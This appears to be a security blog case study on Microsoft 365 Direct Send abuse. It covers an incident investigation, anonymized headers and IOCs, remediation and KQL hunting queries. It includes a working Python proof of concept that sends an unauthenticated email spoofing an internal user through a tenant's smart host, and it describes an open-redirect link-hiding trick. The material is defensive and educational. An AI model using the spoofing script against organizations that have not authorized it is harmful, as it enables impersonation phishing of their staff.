---
title: "M365 Direct Send Abuse: What Happens When the Feature Is the Vulnerability"
date: 2026-03-23
description: "Direct Send is a Microsoft 365 feature designed to let printers send email. It also lets anyone on the internet impersonate your users, bypass your MX security gateway, and land in the inbox -- all without credentials, a CVE, or a compromised account. And it's enabled by default."
categories: [Case Studies]
tags:
  - Phishing
  - Social Engineering
  - Defense
  - PowerShell
  - Windows
  - Policy
  - Threat Intelligence
  - Threat Research
  - Current Events
  - Vulnerability Management
pin: true
---

There is a specific kind of security failure that is harder to explain than a missed patch or a weak password. It is the failure where every control in your stack behaves exactly as designed, generates exactly the right signals, and the attack succeeds anyway. No CVE. No zero-day. No compromised account. Just a gap between where one control's coverage ends and where the next one begins.

This post is about that kind of failure, specifically the one that Microsoft 365 Direct Send abuse exploits, why organizations with mature email security postures are still getting hit by it, and what the interplay between integrity controls, availability trade-offs, and default configurations actually looks like when you pull the thread.

The trigger for this particular investigation was a forwarded email. A user noticed something was off: a message in her inbox that appeared to come from her own address, with a Chase Bank lure and an urgency subject line about an expiring mailbox. The social engineering was unremarkable. What was remarkable was the delivery: the message had arrived through Microsoft's own mail infrastructure, been stamped as an internal sender, and never touched the organization's third-party security gateway. The attacker used zero credentials to impersonate her to herself. That is the attack surface this post is about.

What makes this particularly dangerous is the believability ceiling it removes. A lookalike domain or a display name spoof has tells -- a close-but-wrong address, an external sender banner, a gateway warning. Direct Send abuse has none of those. The email arrives from the exact correct address, through Microsoft's own infrastructure, with no external routing flags. That means an attacker can send a wire transfer request that looks like it came from your CFO, an IT password reset that looks like it came from your helpdesk, or an urgent policy exception that looks like it came from your CEO -- and every visual and technical signal a user has been trained to check will tell them it is legitimate. The attack does not need sophisticated social engineering when the infrastructure itself provides the credibility.

---

## The Threat Landscape

This is not a new technique, but it has had a very active year. Starting in May 2025, multiple threat research teams independently documented ongoing campaigns abusing Direct Send to deliver phishing that looks like it came from inside the target organization. Over 70 organizations confirmed affected, 95% US-based, hitting financial services, healthcare, manufacturing, and construction hardest.

*Source: [Varonis Threat Labs -- Ongoing Campaign Abuses Microsoft 365's Direct Send to Deliver Phishing Emails](https://www.varonis.com/blog/direct-send-exploit)*

What makes it stick is the simplicity. No malware. No CVE. No foothold required.

| Metric | Value |
|---|---|
| Campaign start | May 2025 |
| Organizations targeted (confirmed) | 70+ |
| US-based victims | ~95% |
| Primary verticals | Financial Services, Healthcare, Manufacturing, Construction |
| CVE assigned | None -- abuse of a legitimate feature |
| Credentials required | Zero |

Microsoft released the fix, `RejectDirectSend`, in April 2025. The campaign started in May. That one-month window tells you everything about how quickly attackers read release notes.

*Source: [Microsoft Exchange Team -- Introducing More Control Over Direct Send in Exchange Online](https://techcommunity.microsoft.com/blog/exchange/introducing-more-control-over-direct-send-in-exchange-online/4408790)*

---

## How Direct Send Works (and Why It's a Problem)

Direct Send is a Microsoft 365 feature meant for internal devices like printers, copiers, and legacy LOB apps that need to send email but do not support modern authentication. Instead of going through OAuth or SMTP AUTH, these devices connect directly to the tenant's smart host and submit mail on behalf of the organization's domain, no credentials involved. Microsoft's own documentation recommends Direct Send only for advanced customers willing to take on the responsibilities of email server admins.

*Source: [Microsoft Learn -- Direct Send: Send Mail Directly From Your Device or Application](https://learn.microsoft.com/en-us/exchange/mail-flow-best-practices/how-to-set-up-a-multifunction-device-or-application-to-send-email-using-microsoft-365-or-office-365)*

The smart host endpoint looks like this:

```
<tenantname>.mail.protection.outlook.com
```

Here is the problem: any machine anywhere on the internet can connect to that endpoint on port 25 or 587, claim any `From` address using your domain, and submit an email, unless you have explicitly told Microsoft not to allow it. No username. No password. No token. No prior relationship with the tenant.

### The Attack Path

| Step | Action | Detail |
|---|---|---|
| 1 | Reconnaissance | Attacker finds valid recipients via OSINT, LinkedIn, or prior breach data |
| 2 | Connection | Connects directly to `<tenant>.mail.protection.outlook.com:25` -- bypassing any third-party MX gateway entirely |
| 3 | Delivery | Submits email with spoofed `From` address, no credentials. Microsoft stamps it `InternalOrgSender: True` and delivers. |

The MX bypass is the part worth dwelling on. Most organizations route inbound mail through a third-party gateway (Mimecast, Proofpoint, etc.) by pointing their MX record at it. That gateway scans everything it sees. Direct Send does not go through the MX record. The attacker connects directly to Microsoft's SMTP frontend. Your security gateway never gets a look at the message.

### Why SPF, DKIM, and DMARC Do Not Save You Here

This is the part that surprises people, because on paper these organizations have their email auth configured.

| Protocol | What Happens | Why It Does Not Block |
|---|---|---|
| SPF | SoftFail or Fail | `~all` flags but does not reject. Even `-all` does not stop Direct Send because Microsoft processes this as internal routing before SPF enforcement applies. |
| DKIM | None -- not signed | No private key to sign an unauthenticated submission. Absence of a signature is not the same as a failed signature in all pipeline paths. |
| DMARC | Fail | `p=quarantine` holds the message in some cases but does not prevent delivery when Direct Send routes it as internal. And plenty of tenants never made it to `p=reject`. |

So you get a message that fails every auth check, arrives in the inbox, and gets stamped by Microsoft's own headers as coming from inside the organization. End users see no external sender warning. It looks like a colleague.

---

## Should Your Environment Even Use Direct Send?

Before jumping to remediation, and before you touch `RejectDirectSend`, this is the question worth sitting with. Because if you disable it without knowing what depends on it, you will find out the hard way when someone's scanner stops emailing PDFs to the accounting team.

The legitimate use cases are real:

| Use Case | What to Do Instead |
|---|---|
| Network printers / MFPs | Scope to a static IP via a scoped inbound connector, or migrate to SMTP AUTH with a service account |
| Legacy LOB apps | Authenticated SMTP or Microsoft Graph API if the app supports it; scoped connector if not |
| Monitoring and alerting systems | Dedicated mailbox with OAuth, or authenticated relay |
| On-premises servers | Authenticated connector or modern auth migration |
| Third-party SaaS sending on your behalf | Add to SPF, configure DKIM in the vendor platform, verify DMARC alignment |

If you have any of these, the path is: audit your inbound connectors, identify what is actually using Direct Send, scope those to specific static IPs via dedicated connectors, then enable `RejectDirectSend` globally. The connectors with scoped IPs will still work. Everything else gets a 554.

```powershell
# See what you are working with
Get-InboundConnector | Select Name, SenderIPAddresses, RequireTls
```

If your connectors show `RequireTls: False`, add that to the hardening list too. It is not what this post is about, but it is overdue.

If you genuinely have no dependency on Direct Send, no printers, no old apps, no scanners using it, just enable the setting and move on. You are done with this attack vector in one command.

---

## The Incident: What the Headers Showed

Back to the forwarded email. Once I had the full headers, the story was immediate.

**Microsoft's own label for unauthenticated delivery:**

```
X-MS-Exchange-Organization-IsAnonymousDirectSend: True
```

**The full auth failure chain:**

```
spf=softfail (sender IP is [EXTERNAL-IP]) smtp.mailfrom=[CLIENT-DOMAIN]
dkim=none (message not signed) header.d=none
dmarc=fail action=quarantine
compauth=none reason=451
```

**The internal trust stamp applied to an externally-sourced, unauthenticated message:**

```
X-MS-Exchange-Organization-InternalOrgSender: True
```

**The delivery path: external IP presenting a spoofed loopback EHLO:**

```
Received: from [127.0.0.1] ([EXTERNAL-IP]) by [TENANT].mail.protection.outlook.com
```

**MX bypass confirmed:**

```
X-MS-Exchange-Organization-MxPointsToUs: false
```

**Payload obfuscated behind a Google open redirect:**

```
Persisted-Urls: https://google.[TLD]/url?q=https://[MALICIOUS-DOMAIN].icu
```

**Microsoft's ML stack flagged it. Delivered anyway.**

```
MMH_L=PHISH
BIMP_SHARED_SU_KEY=Chase
```

> **Note:** `IsAnonymousDirectSend: True` can be stripped depending on your DMARC action and pipeline config. If you do not see it, look for `AuthAs: Anonymous` and `CrossTenant-AuthAs: Anonymous`, and those will still be there and tell the same story.

### IOC Summary (Anonymized)

| Indicator | Value | Significance |
|---|---|---|
| Attacker IP | `[EXTERNAL-IP]` | No reverse DNS, unaffiliated infrastructure |
| Phishing domain | `[MALICIOUS-DOMAIN].icu` | Credential harvesting page |
| Redirect | `google.[TLD]/url?q=...` | Open redirect to bypass URL reputation |
| EHLO | `[127.0.0.1]` | Spoofed loopback -- Direct Send signature |
| Delivery route | `[TENANT].mail.protection.outlook.com` | Bypassed MX gateway entirely |

### DNS and Auth Posture

Running the full posture check confirmed DMARC at `p=reject`, DKIM configured correctly, SPF at `~all`. Everything looked healthy on paper. `RejectDirectSend` returned blank. That was the gap.

```powershell
nslookup -type=TXT [CLIENT-DOMAIN]
nslookup -type=TXT _dmarc.[CLIENT-DOMAIN]
nslookup -type=TXT selector1._domainkey.[CLIENT-DOMAIN]
Get-OrganizationConfig | Select RejectDirectSend
```

---

## Proof of Concept: Authorized Testing

> **Authorization Notice:** The following testing was conducted with explicit written authorization against the client's own tenant. Run this only against systems you own or have explicit written permission to test.

The home network I was testing from had port 25 blocked at the ISP level, which is standard. Azure Cloud Shell does not have that restriction, and from Microsoft's perspective, an Azure egress IP is as external and unauthenticated as any other. That makes it a realistic simulation of what the attacker did from their VPS.

### Step 1: Confirm Port 25 is Reachable

`netcat` was not available in Cloud Shell, so Python:

```python
python3 -c "
import socket
try:
    s = socket.create_connection(
        ('[TENANT].mail.protection.outlook.com', 25), timeout=10)
    print('[+] Port 25 OPEN')
    print(f'[+] Banner: {s.recv(1024).decode().strip()}')
    s.close()
except Exception as e:
    print(f'[-] Blocked: {e}')
"
```

Result:

```
[+] Port 25 OPEN
[+] Banner: 220 SJ5PEPF000001F2.mail.protection.outlook.com
    Microsoft ESMTP MAIL Service ready at Wed, 25 Mar 2026 02:15:27 +0000
```

Microsoft's SMTP frontend is up, responding, and not asking for credentials.

### Step 2: Send the Spoofed Email

```python
python3 << 'EOF'
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime

#connect to the target's smart host and choose the intended spoofee
smart_host = "[TENANT].mail.protection.outlook.com"
from_addr  = "[TARGET-USER]@[CLIENT-DOMAIN]"
to_addr    = "[TARGET-USER]@[CLIENT-DOMAIN]"

#customize message subject and body for own needs, ticket number reference ect..
msg = MIMEMultipart()
msg['Subject'] = f"AUTHORIZED PENTEST - Direct Send Simulation {datetime.now().strftime('%m/%d/%Y %H:%M')}"
msg['From']    = from_addr
msg['To']      = to_addr

body = MIMEText("""
AUTHORIZED Direct Send abuse simulation.
- Method : Unauthenticated SMTP via Direct Send smart host
- Ref     : PENTEST-DIRECTSEND-001
""")
msg.attach(body)

#output message upon success/failed connection
try:
    s = smtplib.SMTP(smart_host, 25, timeout=20)
    s.ehlo("localhost")
    s.sendmail(from_addr, [to_addr], msg.as_string())
    s.quit()
    print("[!!!] SUCCESS - EMAIL SENT")
    print("[!!!] TENANT IS VULNERABLE")
except smtplib.SMTPRecipientsRefused as e:
    print(f"[+] SMTP REJECTION: {e}")
    print("    >> RejectDirectSend is active -- PROTECTED")
except Exception as e:
    print(f"[-] {type(e).__name__}: {e}")
EOF
```

Result:

```
[+] Connected successfully
[!!!] SUCCESS - EMAIL SENT
[!!!] TENANT IS VULNERABLE
```

Zero credentials. Under 30 seconds. Delivered.

### Step 3: Confirm Attack Signatures in the Delivered Headers

| Header | Value | What It Means |
|---|---|---|
| `AuthAs` | `Anonymous` | Zero credentials used |
| `CrossTenant-AuthAs` | `Anonymous` | Confirmed across tenant boundary |
| `SPF` | `softfail ([AZURE-CLOUD-IP])` | External, unauthorized IP |
| `DKIM` | `none` | No signing |
| `DMARC` | `fail action=oreject` | Policy fired, did not block |
| `compauth` | `none reason=451` | Composite auth bypassed |
| `PTR` | `InfoDomainNonexistent` | No reverse DNS |
| Delivery destination | `I (Inbox)` | Not junk. Inbox. |

---

## Remediation and Hardening

### Priority 1: Enable RejectDirectSend

This is the only control that actually closes the vector. Everything else in this section is hardening that you should do regardless.

```powershell
Set-OrganizationConfig -RejectDirectSend $true

# Verify
Get-OrganizationConfig | Select RejectDirectSend
# Expected: True
```

> **Note:** The parameter lives on `Set-OrganizationConfig`, not `Set-TransportConfig`. `Set-TransportConfig` will throw a `NamedParameterNotFound` error regardless of your module version.

*Source: [Microsoft Exchange Team -- Introducing More Control Over Direct Send in Exchange Online](https://techcommunity.microsoft.com/blog/exchange/introducing-more-control-over-direct-send-in-exchange-online/4408790)*

After enabling, re-run the PoC. You should get:

```
550 5.7.68 TenantInboundAttribution; Direct Send not allowed for this organization from unauthorized sources
```

That rejection is your proof of remediation.

### Priority 2: Harden SPF

```
v=spf1 include:spf.protection.outlook.com -all
```

Move from `~all` to `-all`. Does not stop Direct Send on its own, but it tightens how unauthorized senders from your domain are treated by external mail servers. Read your DMARC aggregate reports before making this change.

### Priority 3: DMARC to p=reject

```
v=DMARC1; p=reject; rua=mailto:[AGGREGATE-ADDRESS];
ruf=mailto:[FORENSIC-ADDRESS]; adkim=s; aspf=s;
```

Stage it: none -> quarantine -> reject. Do not skip steps. Each stage will surface senders you need to fix before tightening further.

### Priority 4: DKIM

Confirm signing is enabled in Exchange Online. If you are running a third-party gateway like Mimecast, consider enabling DKIM signing there as well for dual coverage on the relay path.

```powershell
Get-DkimSigningConfig | Select Domain, Enabled, Status
```

### Priority 5: Scope Inbound Connectors to Static IPs

For any legitimate Direct Send dependency, create a scoped connector. One connector handles multiple IPs or CIDR ranges, no need for one per device.

```powershell
New-InboundConnector -Name "AuthorizedDeviceRelay" `
  -ConnectorType OnPremises `
  -SenderIPAddresses @(
      "[DEVICE-IP-1]",
      "[DEVICE-IP-2]",
      "[SITE-SUBNET]/24"
  ) `
  -RequireTls $true `
  -RestrictDomainsToIPAddresses $true
```

### Priority 6: Transport Rule for Spoofed Internal Senders

Server-side rule in Exchange Online mail flow. No impact on authenticated users regardless of location or device. A remote user in another country using OWA never triggers this because their mail travels the authenticated path, not the unauthenticated one this rule targets.

```powershell
New-TransportRule -Name "Block External Spoofed Internal Senders" `
  -FromScope NotInOrganization `
  -SenderDomainIs "[CLIENT-DOMAIN]" `
  -SetAuditSeverity High `
  -RejectMessageReasonText "External sender spoofing internal domain"
```

> If your MX points to a third-party gateway, exclude that gateway's inbound IPs from this rule scope. Mimecast and Proofpoint relay legitimate external mail into your tenant using their own IP ranges, and your rule will fire on those too if you do not account for it.

### Priority 7: RequireTLS on Connectors

While you are in there, flip any `RequireTls: False` connectors where operationally feasible.

```powershell
Set-InboundConnector -Identity "[CONNECTOR-NAME]" -RequireTls $true
```

---

## Detection and Hunting

### KQL: Defender Advanced Hunting / Sentinel

**Core: auth failures claiming your domain:**

```kql
EmailEvents
| where Timestamp > ago(30d)
| where AuthenticationDetails has "dkim=none"
| where AuthenticationDetails has "spf=softfail"
    or AuthenticationDetails has "spf=fail"
| where AuthenticationDetails has "dmarc=fail"
| where SenderFromDomain == "[CLIENT-DOMAIN]"
| project Timestamp, SenderFromAddress, RecipientEmailAddress,
    Subject, SenderIPv4, DeliveryAction, DeliveryLocation,
    AuthenticationDetails
| order by Timestamp desc
```

**Self-send detection: note the domain extraction fix:**

Do not compare `SenderFromDomain` directly to `RecipientEmailAddress`. Those types will never match. Extract the domain from the recipient address:

```kql
EmailEvents
| where Timestamp > ago(30d)
| where SenderFromDomain == "[CLIENT-DOMAIN]"
| where AuthenticationDetails has "dkim=none"
| extend RecipDomain = tostring(split(RecipientEmailAddress, "@")[1])
| where RecipDomain == "[CLIENT-DOMAIN]"
| where AuthenticationDetails !has "dkim=pass"
| project Timestamp, SenderFromAddress, RecipientEmailAddress,
    Subject, SenderIPv4, DeliveryAction, AuthenticationDetails
| order by Timestamp desc
```

**Whitelist-based: exclude known legitimate IPs:**

```kql
EmailEvents
| where Timestamp > ago(30d)
| where SenderFromDomain == "[CLIENT-DOMAIN]"
| where AuthenticationDetails !has "dkim=pass"
| where SenderIPv4 !in (
    "[CONNECTOR-IP-1]",
    "[CONNECTOR-IP-2]",
    "[MIMECAST-INBOUND-IP-1]",
    "[MIMECAST-INBOUND-IP-2]"
  )
| project Timestamp, SenderFromAddress, RecipientEmailAddress,
    Subject, SenderIPv4, DeliveryAction, ThreatTypes
| order by Timestamp desc
```

**IOC pivot: hunt by attacker IP:**

```kql
EmailEvents
| where Timestamp > ago(30d)
| where SenderIPv4 == "[ATTACKER-IP]"
| project Timestamp, SenderFromAddress, RecipientEmailAddress,
    Subject, SenderIPv4, DeliveryAction, AuthenticationDetails
```

### PowerShell: Message Trace

`Get-MessageTrace` is deprecated as of September 2025. Use `Get-MessageTraceV2`:

```powershell
Get-MessageTraceV2 -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) |
  Where-Object { $_.Status -eq "Delivered" -and
                 $_.SenderAddress -like "*@[CLIENT-DOMAIN]" } |
  Select-Object Received, SenderAddress, RecipientAddress, Subject
```

---

## Closing Analysis

The question this investigation keeps returning to is not technical. Every header in this email told the correct story. SPF fired. DKIM was absent. DMARC said quarantine. Microsoft's own ML pipeline flagged brand impersonation. The security gateway would have caught it, if it had ever seen the message. None of those controls failed. The architecture failed, because no one had closed the gap between where external filtering ends and where unauthenticated internal delivery begins.

That gap has a name and a fix. `RejectDirectSend` has existed since April 2025. It ships off. The campaign started in May 2025, the month after the control dropped. The organizations targeted through the rest of that year were not organizations without security programs. They were organizations where that one toggle had not been flipped, either because no one knew it existed, because the audit cycle had not reached it, or because the legitimate use case for printers and scanners made it feel risky to touch.

This is where the availability tension in email security actually lives. It is not abstract. Tightening SPF to `-all` before auditing your authorized senders breaks vendor mail. Moving DMARC to `p=reject` before reading your aggregate reports breaks partner forwarding. Enabling `RejectDirectSend` before scoping your device connectors breaks your copiers. Every hardening step in email carries a real operational cost, and that cost is why these controls ship in conservative defaults and why organizations leave them there. Attackers have learned to read that inertia as an attack surface.

The practical takeaway for defenders and purple teamers is narrower than most writeups in this space suggest: the control that closes this specific vector is one setting in Exchange Admin Center: `Set-OrganizationConfig -RejectDirectSend $true`. Run the connector audit first, scope your legitimate relay dependencies to static IPs, then enable it. The KQL queries above give you the hunting baseline before and after. Run the PoC against your own tenant. If the email delivers, you have your answer. If it gets a 550, you have your proof of remediation.

*Source: [Microsoft Exchange Team -- Introducing More Control Over Direct Send in Exchange Online](https://techcommunity.microsoft.com/blog/exchange/introducing-more-control-over-direct-send-in-exchange-online/4408790)*

Everything else in this post, the transport rules, the DKIM hygiene, the TLS enforcement on connectors, is hardening that was overdue regardless of this campaign. Direct Send abuse just makes the conversation easier to have.


---

## References

- [Varonis Threat Labs -- Ongoing Campaign Abuses Microsoft 365's Direct Send to Deliver Phishing Emails](https://www.varonis.com/blog/direct-send-exploit)
- [Proofpoint -- Attackers Exploit M365 for Internal Phishing](https://www.proofpoint.com/us/blog/email-and-cloud-threats/attackers-abuse-m365-for-internal-phishing)
- [Mimecast Threat Intelligence -- Microsoft Direct Send Abuse](https://www.mimecast.com/threat-intelligence-hub/microsoft-direct-send-abuse)
- [Barracuda Networks -- Microsoft Direct Send Phishing Attacks Explained](https://blog.barracuda.com/2025/08/04/securing-microsoft-direct-send)
- [BleepingComputer -- Microsoft 365 Direct Send Abused to Send Phishing as Internal Users](https://www.bleepingcomputer.com/news/security/microsoft-365-direct-send-abused-to-send-phishing-as-internal-users/)
- [Microsoft Exchange Team -- Introducing More Control Over Direct Send in Exchange Online](https://techcommunity.microsoft.com/blog/exchange/introducing-more-control-over-direct-send-in-exchange-online/4408790)
- [Microsoft -- Direct Send: Send Mail Directly From Your Device or Application](https://learn.microsoft.com/en-us/exchange/mail-flow-best-practices/how-to-set-up-a-multifunction-device-or-application-to-send-email-using-microsoft-365-or-office-365)
- [risk3sixty -- Security Advisory: Microsoft 365 Direct Send Abuse in Active Phishing Campaigns](https://risk3sixty.com/blog/security-advisory-microsoft-365-direct-send-abuse-in-active-phishing-campaigns)
- [Black Arrow Cyber Consulting -- Microsoft 365 Direct Send Abuse Enabling Internal-Appearing Phishing](https://www.blackarrowcyber.com/blog/alert-18-august-2025-direct-send-abuse)
